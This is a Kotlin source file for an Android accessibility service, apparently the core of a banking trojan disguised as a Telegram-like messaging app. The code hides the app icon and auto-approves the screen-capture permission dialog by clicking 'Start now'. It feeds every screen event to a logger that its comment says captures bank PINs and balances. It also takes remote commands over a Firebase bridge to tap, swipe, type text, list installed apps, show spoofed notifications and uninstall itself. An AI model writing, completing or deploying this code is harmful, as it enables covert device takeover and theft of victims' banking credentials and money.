package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Path
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.telegram2.messaging.ScreenPermissionActivity
import kotlin.PublishedApi
import java.util.concurrent.CountDownLatch

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
    }

    @PublishedApi
    internal val mainHandler = Handler(Looper.getMainLooper())

    var macroRunning = false
    private var currentTargetPackage: String? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }

        // Push screen dimensions
        sendScreenInfo()

        // Hide app icon
        hideAppIcon()

        // Start screen capture if not running
        if (!isScreenCaptureRunning()) {
            startScreenCapture()
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // Bank logger captures PINs, balances
        BankLogger.onEvent(this, event)

        // Track current package
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            currentTargetPackage = event.packageName?.toString()
            autoGrantMediaProjection()
        }

        // If macro is running and user switches away, bring back target app
        if (macroRunning && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val target = MacroRunner.currentPackage
            if (target != null && event.packageName?.toString() != target) {
                mainHandler.postDelayed({ launchApp(target) }, 2000)
            }
        }
    }

    override fun onInterrupt() {}

    // ========== EXECUTE MACRO (from NLP or manual) ==========
    fun executeMacro(macroId: String, steps: List<MacroRunner.MacroStep>) {
        if (macroRunning) {
            FirebaseBridge.reportMacro(macroId, false, "Another macro is running")
            return
        }
        FirebaseBridge.reportMacro(macroId, false, "Starting...")
        macroRunning = true
        MacroRunner.start(macroId, steps, this) { success, summary ->
            macroRunning = false
            FirebaseBridge.reportMacro(macroId, success, summary)
        }
    }

    // ========== SINGLE COMMANDS ==========
    fun performSingleCommand(type: String, params: Map<String, Any?>) {
        when (type) {
            "tap" -> {
                val x = (params["x"] as? Number)?.toInt() ?: 0
                val y = (params["y"] as? Number)?.toInt() ?: 0
                tap(x, y)
            }
            "swipe" -> {
                val sx = (params["sx"] as? Number)?.toInt() ?: 0
                val sy = (params["sy"] as? Number)?.toInt() ?: 0
                val ex = (params["ex"] as? Number)?.toInt() ?: 0
                val ey = (params["ey"] as? Number)?.toInt() ?: 0
                val dur = (params["duration"] as? Long) ?: 300L
                swipe(sx, sy, ex, ey, dur)
            }
            "type" -> injectText(params["text"] as? String ?: "")
            "hide_activity" -> hideAppIcon()
            "uninstall" -> uninstallSelf()
            "start_screen_capture" -> startScreenCapture()
            "get_apps" -> FirebaseBridge.pushAppsList(getInstalledApps())
            "fake_notification" -> {
                val title = params["title"] as? String ?: "⚠ Alert"
                val text = params["text"] as? String ?: "Tap to view"
                NotificationSpoofer.show(this, title, text, null, null)
            }
        }
    }

    // ---------- Low-level gestures ----------
    fun tap(x: Int, y: Int) {
        val path = Path().apply { moveTo(x.coerceIn(0, 9999).toFloat(), y.coerceIn(0, 9999).toFloat()) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
            .build(), null, null)
    }

    fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, dur: Long) {
        val path = Path().apply {
            moveTo(x1.coerceIn(0, 9999).toFloat(), y1.coerceIn(0, 9999).toFloat())
            lineTo(x2.coerceIn(0, 9999).toFloat(), y2.coerceIn(0, 9999).toFloat())
        }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, dur))
            .build(), null, null)
    }

    fun injectText(text: String) {
        val root = rootInActiveWindow ?: return
        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (focused != null) {
            val bundle = Bundle().apply {
                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            }
            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
        }
    }

    // ---------- Hide / Uninstall ----------
    fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, "com.telegram2.messaging.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

    fun uninstallSelf() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)
        mainHandler.postDelayed({
            val root = rootInActiveWindow ?: return@postDelayed
            val uninstallBtn = findClickableByText(root, "Uninstall")
            if (uninstallBtn != null) {
                uninstallBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                mainHandler.postDelayed({
                    val confirmRoot = rootInActiveWindow ?: return@postDelayed
                    val okBtn = findClickableByText(confirmRoot, "OK")
                        ?: findClickableByText(confirmRoot, "Uninstall")
                        ?: findClickableByViewId(confirmRoot, "android:id/button1")
                    okBtn?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }, 1500)
            }
        }, 2000)
    }

    // ---------- MediaProjection auto-grant ----------
    fun startScreenCapture() {
        startActivity(Intent(this, ScreenPermissionActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        })
    }

    private fun autoGrantMediaProjection() {
        val root = rootInActiveWindow ?: return
        val startNowBtn = findClickableByText(root, "Start now")
        if (startNowBtn != null) {
            startNowBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            return
        }
        for (id in listOf("com.android.systemui:id/start_button", "android:id/button1")) {
            val btn = findClickableByViewId(root, id)
            if (btn != null) {
                btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return
            }
        }
    }

    fun isScreenCaptureRunning(): Boolean {
        val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        return am.getRunningServices(Int.MAX_VALUE)
            .any { it.service.className == ScreenCaptureService::class.java.name }
    }

    fun getInstalledApps(): List<String> = packageManager.getInstalledPackages(0).map { it.packageName }

    private fun sendScreenInfo() {
        val dm = resources.displayMetrics
        FirebaseBridge.updateScreenInfo(dm.widthPixels, dm.heightPixels)
    }

    // App launching
    fun launchApp(pkg: String): Boolean {
        val intent = packageManager.getLaunchIntentForPackage(pkg)
        if (intent == null) return false
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        return true
    }

    // Helper: run on main thread synchronously — NOW SAFE WITH @PublishedApi
    inline fun runOnMainThreadSync(crossinline block: () -> Any?): Any? {
        val latch = CountDownLatch(1)
        var result: Any? = null
        mainHandler.post {
            result = block()
            latch.countDown()
        }
        latch.await()
        return result
    }

    // Find clickable node by text
    private fun findClickableByText(root: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        for (node in root.findAccessibilityNodeInfosByText(text)) {
            if (node.isClickable) return node
        }
        return null
    }

    private fun findClickableByViewId(root: AccessibilityNodeInfo, id: String): AccessibilityNodeInfo? {
        for (node in root.findAccessibilityNodeInfosByViewId(id)) {
            if (node.isClickable) return node
        }
        return null
    }
}
